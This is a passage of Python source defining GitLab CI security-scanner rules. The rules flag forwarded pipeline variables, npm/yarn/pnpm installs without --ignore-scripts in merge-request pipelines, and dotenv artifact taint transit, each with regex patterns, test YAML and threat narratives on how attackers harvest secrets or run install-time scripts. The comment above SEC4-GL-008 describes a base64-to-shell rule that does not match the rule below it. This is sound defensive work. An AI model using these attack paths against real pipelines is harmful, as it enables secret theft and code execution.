        reference="https://docs.gitlab.com/ci/yaml/#triggerforward",
        test_positive=[
            "trigger:\n  include: child.yml\n  forward:\n    pipeline_variables: true",
            "    forward:\n      pipeline_variables: true",
        ],
        test_negative=[
            "    forward:\n      pipeline_variables: false",
            # yaml_variables forwarding is the safe, defaulted behaviour.
            "    forward:\n      yaml_variables: true",
            "    # pipeline_variables: true",
        ],
        stride=["I", "E"],
        threat_narrative=(
            "Forwarding pipeline variables hands the parent's manual "
            "(often secret) inputs to a downstream pipeline that may run "
            "in another project's trust domain and without the parent's "
            "masking. An attacker who can influence the downstream "
            "pipeline — or simply read its job logs — harvests secrets "
            "that were never meant to leave the parent."
        ),
    ),
    # =========================================================================
    # LOTP-GL-003: npm/yarn/pnpm install without --ignore-scripts in an MR
    # pipeline — lifecycle scripts from attacker-controlled package.json
    # run during install.  GitLab port of LOTP-GH-003 (Ultralytics class).
    # =========================================================================
    Rule(
        id="LOTP-GL-003",
        title=("npm / yarn / pnpm install without --ignore-scripts in an MR pipeline"),
        severity=Severity.HIGH,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitLab pipeline runs ``npm install`` / ``npm ci`` / "
            "``yarn install`` / ``pnpm install`` without "
            "``--ignore-scripts`` in a job reachable from merge-request "
            "pipelines (``rules:`` includes "
            "``$CI_PIPELINE_SOURCE == 'merge_request_event'`` or "
            "legacy ``only: - merge_requests``).  npm / yarn / pnpm "
            "execute ``preinstall`` / ``install`` / ``postinstall`` "
            "lifecycle scripts from every package.json by default — "
            "including the one checked out from the MR branch.  "
            "Adding ``--ignore-scripts`` disables this path and closes "
            "the most common LOTP vector for JavaScript builds.  "
            "Same attack class as the Ultralytics compromise "
            "(December 2024), ported from GitHub."
        ),
        pattern=ContextPattern(
            anchor=r"\b(?:npm\s+(?:install|ci|i)|yarn\s+install|yarn(?=\s*(?:$|[;&|]))|pnpm\s+(?:install|i))\b",
            requires=(
                r"(?m:"
                r"\$CI_PIPELINE_SOURCE\s*==\s*['\"]?merge_request_event"
                r"|\$CI_PIPELINE_SOURCE\s*==\s*['\"]?external_pull_request_event"
                r"|^\s*-\s*if:\s*\$CI_MERGE_REQUEST_"
                r"|^\s*-\s*merge_requests\b"
                r")"
            ),
            scope="file",
            exclude=[
                r"^\s*#",
                r"--ignore-scripts",
            ],
        ),
        remediation=(
            "Add ``--ignore-scripts`` to every npm / yarn / pnpm\n"
            "install command in MR-triggered pipelines:\n"
            "\n"
            "mr-test:\n"
            "  rules:\n"
            "    - if: '$CI_PIPELINE_SOURCE == \"merge_request_event\"'\n"
            "  script:\n"
            "    - npm ci --ignore-scripts\n"
            "    - npm test\n"
            "\n"
            "For pnpm, also set ``ignore-scripts=true`` in ``.npmrc``\n"
            "so the default is sticky across future contributors."
        ),
        reference=("https://docs.npmjs.com/cli/v10/using-npm/scripts#ignoring-scripts"),
        test_positive=[
            # MR-triggered job with npm install
            (
                "mr-test:\n"
                "  rules:\n"
                "    - if: '$CI_PIPELINE_SOURCE == \"merge_request_event\"'\n"
                "  script:\n"
                "    - npm install"
            ),
            # Legacy only: - merge_requests + npm ci
            ("test:\n  only:\n    - merge_requests\n  script:\n    - npm ci\n    - npm test"),
            # pnpm install form
            ("check:\n  rules:\n    - if: $CI_MERGE_REQUEST_IID\n  script:\n    - pnpm install"),
            # Bare ``yarn`` — Yarn 1.x / Berry treat this as shorthand for
            # ``yarn install`` (runs lifecycle scripts).
            (
                "mr-test:\n"
                "  rules:\n"
                "    - if: '$CI_PIPELINE_SOURCE == \"merge_request_event\"'\n"
                "  script:\n"
                "    - yarn"
            ),
            # Bare ``yarn`` chained — still an install + lifecycle-script run.
            (
                "mr-test:\n"
                "  rules:\n"
                "    - if: '$CI_PIPELINE_SOURCE == \"merge_request_event\"'\n"
                "  script:\n"
                "    - yarn && yarn test"
            ),
        ],
        test_negative=[
            # --ignore-scripts present → safe
            (
                "mr-test:\n"
                "  rules:\n"
                "    - if: '$CI_PIPELINE_SOURCE == \"merge_request_event\"'\n"
                "  script:\n"
                "    - npm ci --ignore-scripts"
            ),
            # Not MR-triggered → not LOTP-reachable
            (
                "build:\n"
                "  rules:\n"
                "    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'\n"
                "  script:\n"
                "    - npm install"
            ),
            # Comment
            "    # npm install",
            # yarn <non-install subcommand> in MR pipeline — must not fire
            (
                "mr-test:\n"
                "  rules:\n"
                "    - if: '$CI_PIPELINE_SOURCE == \"merge_request_event\"'\n"
                "  script:\n"
                "    - yarn jest:integration"
            ),
            (
                "mr-test:\n"
                "  rules:\n"
                "    - if: '$CI_PIPELINE_SOURCE == \"merge_request_event\"'\n"
                "  script:\n"
                "    - yarn run lint"
            ),
            # yarn.lock filename in MR-reachable job
            (
                "mr-test:\n"
                "  rules:\n"
                "    - if: '$CI_PIPELINE_SOURCE == \"merge_request_event\"'\n"
                "  script:\n"
                "    - cp yarn.lock dist/"
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "npm's default lifecycle-script execution is the single "
            "most exploited LOTP vector.  An attacker who opens an MR "
            "editing ``package.json``'s ``postinstall`` field gets "
            "their command executed during ``npm install`` — before "
            "test, lint, or security gates run — so the payload "
            "fires regardless of what the rest of the pipeline does.  "
            "Ultralytics (December 2024) used this exact shape on "
            "GitHub; GitLab MR pipelines that lack "
            "``--ignore-scripts`` are structurally identical."
        ),
        incidents=["Ultralytics (Dec 2024, GH analog)"],
    ),
    # =========================================================================
    # SEC4-GL-008: ``base64 -d | shell`` obfuscation in script block
    # =========================================================================
    # GitLab port of SEC4-GH-022.
    # Encoded payloads in ``script:`` blocks bypass diff-review
    # heuristics and string-pattern scanners.  Same threat shape as
    # the GitHub-Actions rule.
    Rule(
        id="SEC4-GL-008",
        title="dotenv artifact transit — variables passed between jobs need source review",
        severity=Severity.LOW,
        platform=Platform.GITLAB,
        owasp_cicd="CICD-SEC-4",
        review_needed=True,
        confidence="low",
        description=(
            "The pipeline uses ``artifacts:reports:dotenv`` to pass "
            "variables from a producer job to a consumer job via "
            "``needs:``.  Dotenv artifacts are an opaque taint transit "
            "channel: the consumer job's ``script:`` references "
            "``$KEY`` and has no static way to know whether the "
            "producer derived KEY from attacker-controllable context "
            "(``$CI_COMMIT_TITLE``, ``$CI_MERGE_REQUEST_TITLE``, file "
            "contents, branch name).  Review every producer job's "
            "logic that writes into the dotenv artifact — if any "
            "upstream value is attacker-controllable, sanitise at the "
            "producer (allowlist regex, character-class filter) "
            "before writing to ``$GITLAB_OUTPUT``-equivalent dotenv "
            "files.  SEC4-GL-001 already covers the direct splice of "
            "predefined CI variables; this rule covers the indirect "
            "transit form."
        ),
        pattern=DotenvReportPattern(),
        remediation=(
            "Audit the producer job that writes to the dotenv "
            "artifact:\n"
            "\n"
            "  build:\n"
            "    script:\n"
            "      # If CI_COMMIT_TITLE can carry attacker bytes,\n"
            "      # sanitise before writing.\n"
            '      - SAFE_TITLE=$(echo "$CI_COMMIT_TITLE" | tr -cd "[:alnum:] -")\n'
            '      - echo "TITLE=$SAFE_TITLE" >> build.env\n'
            "    artifacts:\n"
            "      reports:\n"
            "        dotenv: build.env\n"
            "\n"
            'The consumer\'s ``script: - echo \\"$TITLE\\"`` is then '
            "safe because the producer enforces the alphabet."
        ),
        reference="https://docs.gitlab.com/ee/ci/yaml/artifacts_reports.html#artifactsreportsdotenv",
        test_positive=[
            (
                'build:\n  stage: build\n  script:\n    - echo "VERSION=$CI_COMMIT_TAG" > vars.env\n'
                "  artifacts:\n    reports:\n      dotenv: vars.env\n"
            ),
            (
                'produce:\n  script:\n    - echo "X=value" > out.env\n'
                "  artifacts:\n    reports:\n      dotenv: out.env\n"
            ),
        ],
        test_negative=[
            # Non-dotenv artifact reports — different transit channel.
            (
                "test:\n  script:\n    - pytest\n"
                "  artifacts:\n    reports:\n      junit: junit.xml\n"
            ),
            # No reports: block at all.
            "build:\n  script:\n    - make\n  artifacts:\n    paths:\n      - dist/\n",
        ],
        stride=["T"],
        threat_narrative=(
            "Dotenv artifacts are an opaque transit channel for "
            "attacker-controllable bytes.  A pipeline author who "
            "carefully quotes ``$CI_COMMIT_TITLE`` in a build job's "
            "script can still be compromised when that job writes the "
            "title to a dotenv artifact and a downstream job splices "
            "it into a shell command unquoted.  SEC4-GL-001 catches "
            "the direct form; this rule surfaces the transit form for "
            "producer-side review."
        ),
    ),
]
